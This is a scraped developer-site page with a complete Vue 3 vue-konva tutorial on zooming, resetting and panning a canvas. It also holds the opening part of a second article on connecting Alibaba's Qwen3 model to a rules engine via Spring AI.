pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">Vue-Konva 使用（缩放 / 还原 / 拖动） 示例（当前示例为vue3版本）</h2>
<h3 data-id="heading-1">目标</h3>
<ul>
<li>在一个 Vue 单文件组件中，完成以下交互：
<ul>
<li>鼠标滚轮相对指针位置缩放（向上放大、向下缩小）</li>
<li>按钮（支持长按）居中放大 / 居中缩小 / 还原</li>
<li>按住 <code>Ctrl + 左键</code> 拖动画布（仅在放大后可拖动）</li>
<li>缩小时居中显示、禁止拖动</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">安装与注册</h3>
<ul>
<li>安装依赖（任选包管理器）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">npm i vue-konva konva
<span class="hljs-comment"># 或</span>
pnpm add vue-konva konva
</code></pre>
<ul>
<li>注册插件（两种方式）：
<ul>
<li>入口处全局注册：</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueKonva</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-konva'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
<span class="hljs-comment">// 使用 v- 前缀，也可以自定义：{ prefix: 'V' }</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">VueKonva</span>, { <span class="hljs-attr">prefix</span>: <span class="hljs-string">'V'</span> });
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<ul>
<li>组件内自注册（在组件 <code>setup</code> 阶段注册，确保首帧渲染前完成）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 在组件 setup 阶段注册，避免首次渲染前出现未注册错误</span>
<span class="hljs-keyword">import</span> { getCurrentInstance } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueKonva</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-konva'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">getCurrentInstance</span>()?.<span class="hljs-property">appContext</span>.<span class="hljs-property">app</span>;
app?.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">VueKonva</span>, { <span class="hljs-attr">prefix</span>: <span class="hljs-string">'V'</span> });
</code></pre>
<h3 data-id="heading-3">组件与事件说明</h3>
<ul>
<li><code>VStage</code>：Konva <code>Stage</code> 的 Vue 封装，是画布根容器。
<ul>
<li>事件：<code>@wheel</code>（滚轮缩放）、<code>@mousedown/@mousemove/@mouseup/@mouseleave</code>（平移手势）</li>
</ul>
</li>
<li><code>VLayer</code>：Konva <code>Layer</code> 的 Vue 封装，是真正的 <code>&lt;canvas&gt;</code> 层，可放多个图层。</li>
<li><code>VRect</code> / <code>VText</code> / <code>VImage</code> / <code>VTransformer</code>：Konva 基础与变换组件。</li>
</ul>
<h3 data-id="heading-4">交互设计要点</h3>
<ul>
<li>指针相对缩放：通过记录指针位置 <code>pos</code>，计算缩放前指针对应的画布坐标 <code>mousePointTo</code>，再反算缩放后画布位置，使“缩放围绕指针”发生。</li>
<li>居中缩放按钮：以画布中心为缩放锚点，保证视觉稳定。</li>
<li>边界约束：
<ul>
<li>当 <code>scale &lt;= 1</code>（缩小）时，强制居中显示，禁止平移。</li>
<li>当 <code>scale &gt; 1</code>（放大）时，限制平移在可视范围内，避免出现大面积空白。</li>
</ul>
</li>
<li>Ctrl 拖动：按住 <code>Ctrl + 左键</code> 时，禁用元素交互（不可拖动 / 不响应点击），专注于画布平移。</li>
</ul>
<h3 data-id="heading-5">单文件组件示例（可直接使用）</h3>
<blockquote>
<p>复制到你的项目中即可运行。若已在入口处注册了 <code>VueKonva</code>，组件内注册可删除。</p>
</blockquote>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { getCurrentInstance, onMounted, onUnmounted, ref } from 'vue';
import VueKonva from 'vue-konva';

// 组件内自注册 VueKonva（你也可以在应用入口统一注册）
const app = getCurrentInstance()?.appContext.app;
app?.use(VueKonva, { prefix: 'V' });
// 画布尺寸（根据实际需求调整）
const canvasSize = { width: 800, height: 600 };

// VStage 的模板引用，用于获取 Konva Stage 实例
const stageRef = ref&lt;any&gt;(null);

// Ctrl + 左键平移相关状态
const isPanning = ref(false); // 是否正在平移
const panStartPointer = ref&lt;{ x: number, y: number } | null&gt;(null); // 平移起点的指针位置
const panStartStagePos = ref&lt;{ x: number, y: number } | null&gt;(null); // 平移起点的画布位置
const isCtrlPressing = ref(false); // 是否按住了 Ctrl 键（影响元素交互与光标）

// 获取 Konva Stage 实例
function getStage() {
  const node = stageRef.value?.getNode?.();
  return node ?? null;
}

// 连续缩放比例步进（越接近 1 越平滑）
const SCALE_STEP = 1.05;

// 约束画布位置：
// - 缩放 ≤ 1 时，居中显示，不允许漂移
// - 缩放 &gt; 1 时，限制在可视范围内，避免出现空白
function clampStagePosition(stage: any) {
  const s = stage.scaleX();
  if (s &lt;= 1) {
    const cx = stage.width() * (1 - s) / 2;
    const cy = stage.height() * (1 - s) / 2;
    stage.position({ x: cx, y: cy });
    return;
  }
  const maxX = 0;
  const minX = stage.width() * (1 - s);
  const maxY = 0;
  const minY = stage.height() * (1 - s);
  const pos = stage.position();
  const clampedX = Math.min(maxX, Math.max(minX, pos.x));
  const clampedY = Math.min(maxY, Math.max(minY, pos.y));
  stage.position({ x: clampedX, y: clampedY });
}

// 指针相对缩放：保持指针下的内容为缩放中心
// factor &gt; 1 放大；factor &lt; 1 缩小
// doClamp = true（滚轮）：需要边界约束
// doClamp = false（按钮）：不立即约束，但当缩小到 ≤1 时仍需居中
function zoomBy(factor: number, pointer?: { x: number, y: number }, doClamp = true) {
  const stage = getStage();
  if (!stage)
    return;

  const oldScale = stage.scaleX();
  const pos = pointer ?? stage.getPointerPosition() ?? { x: stage.width() / 2, y: stage.height() / 2 };

  // 计算指针相对缩放锚点
  const mousePointTo = {
    x: (pos.x - stage.x()) / oldScale,
    y: (pos.y - stage.y()) / oldScale,
  };

  // 应用缩放
  const newScale = oldScale * factor;
  stage.scale({ x: newScale, y: newScale });

  // 反算缩放后的位置，使缩放相对锚点
  const newPos = {
    x: pos.x - mousePointTo.x * newScale,
    y: pos.y - mousePointTo.y * newScale,
  };
  stage.position(newPos);

  // 边界约束策略
  if (doClamp) {
    clampStagePosition(stage);
  }
  else {
    if (newScale &lt;= 1)
      clampStagePosition(stage);
  }

  stage.batchDraw();
}

// 按钮：从画布中心放大
function zoomIn() {
  const stage = getStage();
  if (!stage)
    return;
  zoomBy(SCALE_STEP, { x: stage.width() / 2, y: stage.height() / 2 }, false);
}

// 按钮：从画布中心缩小
function zoomOut() {
  const stage = getStage();
  if (!stage)
    return;
  zoomBy(1 / SCALE_STEP, { x: stage.width() / 2, y: stage.height() / 2 }, false);
}

// 长按：支持按住按钮持续缩放，短按触发一次
const holdTimeout = ref&lt;number | null&gt;(null);
const holdInterval = ref&lt;number | null&gt;(null);
const holdAction = ref&lt;'in' | 'out' | null&gt;(null);
const HOLD_DELAY_MS = 250;     // 长按判定延迟
const HOLD_INTERVAL_MS = 60;   // 长按时的连续触发间隔

function clearHoldTimers() {
  if (holdTimeout.value) {
    window.clearTimeout(holdTimeout.value);
    holdTimeout.value = null;
  }
  if (holdInterval.value) {
    window.clearInterval(holdInterval.value);
    holdInterval.value = null;
  }
}

function onPressStart(action: 'in' | 'out') {
  clearHoldTimers();
  holdAction.value = action;
  holdTimeout.value = window.setTimeout(() =&gt; {
    holdInterval.value = window.setInterval(() =&gt; {
      if (holdAction.value === 'in')
        zoomIn();
      else
        zoomOut();
    }, HOLD_INTERVAL_MS);
  }, HOLD_DELAY_MS);
}

function onPressEnd() {
  // 短按：尚未进入长按循环时触发一次
  if (holdTimeout.value &amp;&amp; !holdInterval.value &amp;&amp; holdAction.value) {
    if (holdAction.value === 'in')
      zoomIn();
    else
      zoomOut();
  }
  clearHoldTimers();
  holdAction.value = null;
}

// 还原：缩放为 1，位置归位（中心）
function resetZoom() {
  const stage = getStage();
  if (!stage)
    return;
  stage.scale({ x: 1, y: 1 });
  stage.position({ x: 0, y: 0 });
  stage.batchDraw();
}

// 滚轮缩放：向上放大，向下缩小；相对指针的位置
function onWheel(e: any) {
  const stage = getStage();
  if (!stage)
    return;
  e.evt?.preventDefault?.();
  const direction = e.evt?.deltaY &gt; 0 ? (1 / SCALE_STEP) : SCALE_STEP;
  zoomBy(direction, stage.getPointerPosition() ?? undefined);
}

// Ctrl+左键开始平移（仅当缩放 &gt; 1 时有效）
function onStageMouseDown(e: any) {
  const stage = getStage();
  if (!stage)
    return;
  if (e.evt?.ctrlKey &amp;&amp; e.evt?.button === 0) {
    if (stage.scaleX() &lt;= 1)
      return;
    e.evt.preventDefault();
    isPanning.value = true;
    panStartPointer.value = stage.getPointerPosition() ?? null;
    const pos = stage.position();
    panStartStagePos.value = { x: pos.x, y: pos.y };
  }
}

// 平移中：根据起点与当前指针计算偏移，并做边界约束
function onStageMouseMove() {
  if (!isPanning.value)
    return;
  const stage = getStage();
  if (!stage)
    return;
  const pointer = stage.getPointerPosition();
  if (!pointer || !panStartPointer.value || !panStartStagePos.value)
    return;
  const dx = pointer.x - panStartPointer.value.x;
  const dy = pointer.y - panStartPointer.value.y;
  stage.position({ x: panStartStagePos.value.x + dx, y: panStartStagePos.value.y + dy });
  clampStagePosition(stage);
  stage.batchDraw();
}

// 结束平移，重置状态
function onStageMouseUp() {
  isPanning.value = false;
  panStartPointer.value = null;
  panStartStagePos.value = null;
}

// 记录 Ctrl 按键状态，用于切换元素交互与容器鼠标样式
function onKeyDown(e: KeyboardEvent) {
  if (e.key === 'Control')
    isCtrlPressing.value = true;
}
function onKeyUp(e: KeyboardEvent) {
  if (e.key === 'Control')
    isCtrlPressing.value = false;
}

onMounted(() =&gt; {
  window.addEventListener('keydown', onKeyDown);
  window.addEventListener('keyup', onKeyUp);
});
onUnmounted(() =&gt; {
  window.removeEventListener('keydown', onKeyDown);
  window.removeEventListener('keyup', onKeyUp);
  clearHoldTimers();
});

// 示例图形配置（矩形&amp;文字）
// Ctrl 按下时禁用元素交互（不可拖动/不可点击），专注画布平移
const rectConfig = ref({
  x: canvasSize.width / 2 - 100,
  y: canvasSize.height / 2 - 50,
  width: 200,
  height: 100,
  fill: '#80c7ff',
  stroke: '#0ea5e9',
  strokeWidth: 1,
  draggable: true,
});
const textConfig = ref({
  x: canvasSize.width / 2 - 50,
  y: canvasSize.height / 2 + 70,
  text: 'Hello, Konva!',
  fontSize: 18,
  fill: '#334155',
});
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="konva-demo-container" :class="{ 'cursor-pointer': isCtrlPressing }"&gt;
    &lt;!-- 工具栏：居左上角 --&gt;
    &lt;div class="toolbar"&gt;
      &lt;button class="btn btn-outline"
              @mousedown="onPressStart('in')" @mouseup="onPressEnd" @mouseleave="onPressEnd"
              @touchstart.prevent="onPressStart('in')" @touchend="onPressEnd"&gt;
        ＋ 放大
      &lt;/button&gt;
      &lt;button class="btn btn-outline"
              @mousedown="onPressStart('out')" @mouseup="onPressEnd" @mouseleave="onPressEnd"
              @touchstart.prevent="onPressStart('out')" @touchend="onPressEnd"&gt;
        － 缩小
      &lt;/button&gt;
      &lt;button class="btn btn-secondary" @click="resetZoom"&gt;
        ⟳ 还原
      &lt;/button&gt;
      &lt;span class="hint"&gt;按住 Ctrl + 左键可拖动画布（仅放大后可用）&lt;/span&gt;
    &lt;/div&gt;

    &lt;!-- 画布容器（Konva） --&gt;
    &lt;div class="stage-wrapper" :style="{ width: `${canvasSize.width}px`, height: `${canvasSize.height}px` }"&gt;
      &lt;VStage
        ref="stageRef"
        :config="{ width: canvasSize.width, height: canvasSize.height }"
        @wheel="onWheel"
        @mousedown="onStageMouseDown"
        @mousemove="onStageMouseMove"
        @mouseup="onStageMouseUp"
        @mouseleave="onStageMouseUp"
      &gt;
        &lt;VLayer&gt;
          &lt;!-- 示例矩形：Ctrl 时禁用交互 --&gt;
          &lt;VRect :config="{ ...rectConfig, draggable: !isCtrlPressing, listening: !isCtrlPressing }" /&gt;
          &lt;!-- 示例文字（不拖动，仅展示） --&gt;
          &lt;VText :config="textConfig" /&gt;
        &lt;/VLayer&gt;
      &lt;/VStage&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;style scoped&gt;
.konva-demo-container {
  position: relative;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  min-height: 100vh;
  background: linear-gradient(90deg, #f0f0f0 1px, transparent 1px), linear-gradient(#f0f0f0 1px, transparent 1px);
  background-size: 20px 20px;
}

.toolbar {
  position: absolute;
  top: 16px;
  left: 16px;
  display: flex;
  gap: 8px;
  align-items: center;
  z-index: 10;
}

.btn {
  height: 32px;
  padding: 0 12px;
  border-radius: 6px;
  font-size: 13px;
  cursor: pointer;
  user-select: none;
}
.btn-outline {
  border: 1px solid #cbd5e1;
  background: #ffffff;
}
.btn-outline:hover {
  background: #f8fafc;
}
.btn-secondary {
  color: #0f172a;
  background: #e2e8f0;
  border: 1px solid #cbd5e1;
}
.hint {
  font-size: 12px;
  color: #64748b;
  margin-left: 8px;
}

.stage-wrapper {
  margin-top: 64px;
  border-radius: 8px;
  box-shadow: 0 4px 24px rgba(2, 6, 23, 0.08);
  background: #fff;
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-6">常见问题与优化建议</h3>
<ul>
<li>为什么缩小时会“跑左上角”？
<ul>
<li>未做“缩放 ≤ 1 的居中约束”会导致位置归零（左上角）。本文示例通过 <code>clampStagePosition</code> 在缩小时居中。</li>
</ul>
</li>
<li>为什么放大后拖动会被限制？
<ul>
<li>为避免出现空白区域，拖动范围会被限制在内容可视范围内。</li>
</ul>
</li>
<li>如何让按钮也按“指针位置”缩放？
<ul>
<li>将 <code>zoomIn/zoomOut</code> 的第二个参数换成 <code>stage.getPointerPosition()</code> 即可，但习惯上按钮用画布中心更稳定。</li>
</ul>
</li>
<li>光标反馈（增强）：
<ul>
<li>可在 <code>Ctrl</code> 按下时用 <code>cursor: grab</code>，平移过程中用 <code>cursor: grabbing</code> 增强手感。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">参考文档</h3>
<ul>
<li>Konva 官方（Vue）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkonvajs.org%2Fdocs%2Fvue%2Findex.html" target="_blank" title="https://konvajs.org/docs/vue/index.html" ref="nofollow noopener noreferrer">konvajs.org/docs/vue/in…</a></li>
<li>指针相对缩放（官方示例）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkonvajs.org%2Fdocs%2Fsandbox%2FZooming_Relative_To_Pointer.html" target="_blank" title="https://konvajs.org/docs/sandbox/Zooming_Relative_To_Pointer.html" ref="nofollow noopener noreferrer">konvajs.org/docs/sandbo…</a></li>
<li>vue-konva README（前缀 / 获取 Stage 引用）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkonvajs%2Fvue-konva%2Fblob%2Fmaster%2FREADME.md" target="_blank" title="https://github.com/konvajs/vue-konva/blob/master/README.md" ref="nofollow noopener noreferrer">github.com/konvajs/vue…</a></li>
<li>StackOverflow：通过 <code>ref</code> 获取 Stage：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F58411623%2Fkonvajs-vuejs-how-to-access-stage-width-in-vue" target="_blank" title="https://stackoverflow.com/questions/58411623/konvajs-vuejs-how-to-access-stage-width-in-vue" ref="nofollow noopener noreferrer">stackoverflow.com/questions/5…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南]]></title>    <link>https://juejin.cn/post/7575413146922352655</link>    <guid>https://juejin.cn/post/7575413146922352655</guid>    <pubDate>2025-11-24T01:38:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146922352655" data-draft-id="7576077034741579810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-24T01:38:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天天摸鱼的java工程师"/> <meta itemprop="url" content="https://juejin.cn/user/3109843365802925"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3109843365802925/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天天摸鱼的java工程师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:38:26.000Z" title="Mon Nov 24 2025 01:38:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀 <strong>首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南</strong></h2>
<blockquote>
<p>🧑‍💻 作者：# 天天摸鱼的java工程师<br/>
🏆 项目投稿：TRAE SOLO 技术大奖赛<br/>
📌 关键词：Spring AI、Qwen3、大模型、TRAE、TARE、公众号接入、全栈实践</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">🧠 背景：大模型很火，但接入业务才是关键</h3>
<p>作为一名写了 8 年 Java 的开发者，我对“新技术”一直保持谨慎乐观的态度。大模型火了这么久，从最开始写玩具聊天到现在落地业务，<strong>真正能跑在生产环境里的项目，还不多。</strong></p>
<p>这次我选择从我们内部的 <strong>TARE 项目</strong> 下手，尝试把 <strong>阿里 Qwen3 大模型</strong> 通过 <strong>Spring AI</strong> 接入系统，同时通过 <strong>TRAE SOLO</strong> 构建业务流程 UI，最终做到：</p>
<blockquote>
<p><strong>从模型接入 ➡️ 业务集成 ➡️ 公众号对接，一套完整闭环流程。</strong></p>
</blockquote>
<p>并将其作为参赛项目，提交给 <strong>TRAE SOLO 技术大奖赛</strong>。</p>
<hr/>
<h3 data-id="heading-2">📦 项目目标：三步走</h3>
<h4 data-id="heading-3">✅ Step 1：使用 Spring AI 接入阿里 Qwen3 模型</h4>
<h4 data-id="heading-4">✅ Step 2：将模型能力集成到 TARE 项目中（规则生成、任务建议）</h4>
<h4 data-id="heading-5">✅ Step 3：通过 TRAE SOLO 构建前端页面，打通公众号接口，实现问答服务</h4>
<hr/>
<h3 data-id="heading-6">🧰 技术栈选型</h3>





























<table><thead><tr><th>模块</th><th>技术方案</th></tr></thead><tbody><tr><td>大模型接入</td><td>Spring AI + Qwen3 (阿里通义千问)</td></tr><tr><td>后端框架</td><td>Spring Boot 3 + WebFlux</td></tr><tr><td>页面编排</td><td>TRAE SOLO（低代码拖拽 UI + 接口绑定）</td></tr><tr><td>消息平台</td><td>微信公众号 + 自建服务路由</td></tr><tr><td>项目模块</td><td>TARE（流程自动化规则系统）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">🛠 实战细节拆解</h3>
<hr/>
<h4 data-id="heading-8">✅ 一、Spring AI + Qwen3 模型接入配置</h4>
<p>Spring AI 作为 Spring 官方推出的大模型集成框架，接入阿里 Qwen3 非常顺滑。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">ai:</span>
    <span class="hljs-attr">openai:</span>
      <span class="hljs-attr">base-url:</span> <span class="hljs-string">https://dashscope.aliyuncs.com/compatible-mode/v1</span>
      <span class="hljs-attr">api-key:</span> <span class="hljs-string">${ALI_API_KEY}</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">OpenAiChatClient</span> <span class="hljs-title function_">chatClient</span>(<span class="hljs-params">OpenAiApi openAiApi</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAiChatClient</span>(openAiApi);
}
</code></pre>
<p><strong>接口封装：</strong></p>
<pre><code class="hljs language-scss" lang="scss">public String <span class="hljs-built_in">askQwen</span>(String question) {
    ChatRequest request = ChatRequest<span class="hljs-selector-class">.builder</span>()
        <span class="hljs-selector-class">.model</span>("qwen-plus")
        <span class="hljs-selector-class">.messages</span>(List.of(ChatMessage.userMessage(question)))
        <span class="hljs-selector-class">.build</span>();

    ChatResponse response = chatClient<span class="hljs-selector-class">.call</span>(request);
    return response<span class="hljs-selector-class">.getResult</span>()<span class="hljs-selector-class">.getOutput</span>()<span class="hljs-selector-class">.getChoices</span>()<span class="hljs-selector-class">.get</span>(<span class="hljs-number">0</span>)<span class="hljs-selector-class">.getMessage</span>()<span class="hljs-selector-class">.getContent</span>();
}
</code></pre>
<hr/>
<h4 data-id="heading-9">✅ 二、TARE 项目中引入模型能力</h4>
<p>TARE 本身是一个规则驱动的业务引擎，之前规则配置主要靠人工设置。</p>
<p>这次我新增了一个模块： <strong>“AI 智能推荐规则”</strong></p>
<h5 data-id="heading-10">👇 使用方式：</h5>
<ol>
<li>用户在 TRAE 页面上选择“生成规则建议”</li>
<li>输入业务场景（如“客户投诉自动分配”）</li>
<li>后端将场景描述传给 Qwen3</li>
<li>模型返回规则草案（JSON 格式）</li>
<li>用户可一键导入至现有流程中</li>
</ol>
<h5 data-id="heading-11">示例对话：</h5>
<blockquote>
<p>用户输入：<br/>
“我想自动将 VIP 投诉分配给一线客服，普通客户则进入普通队列。”</p>
</blockquote>
<blockquote>
<p>模型返回：</p>
</blockquote>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"规则条件"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"用户等级 == VIP"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"执行动作"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"任务分配至高级客服组"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"否则"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"任务进入普通审核流程"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>👉 用户点击“导入”后，规则自动写入 TARE 流程引擎，并通过 TRAE 页面实时生效。</strong></p>
<hr/>
<h4 data-id="heading-12">✅ 三、TRAE SOLO 页面搭建与交互细节</h4>
<h5 data-id="heading-13">页面结构：</h5>





















<table><thead><tr><th>区域</th><th>功能</th></tr></thead><tbody><tr><td>左侧导航</td><td>规则管理 / AI推荐 / 历史记录</td></tr><tr><td>中间主区</td><td>表单输入 + 模型返回内容</td></tr><tr><td>右侧</td><td>JSON 规则预览 + 一键导入按钮</td></tr></tbody></table>
<h5 data-id="heading-14">核心交互细节：</h5>
<ul>
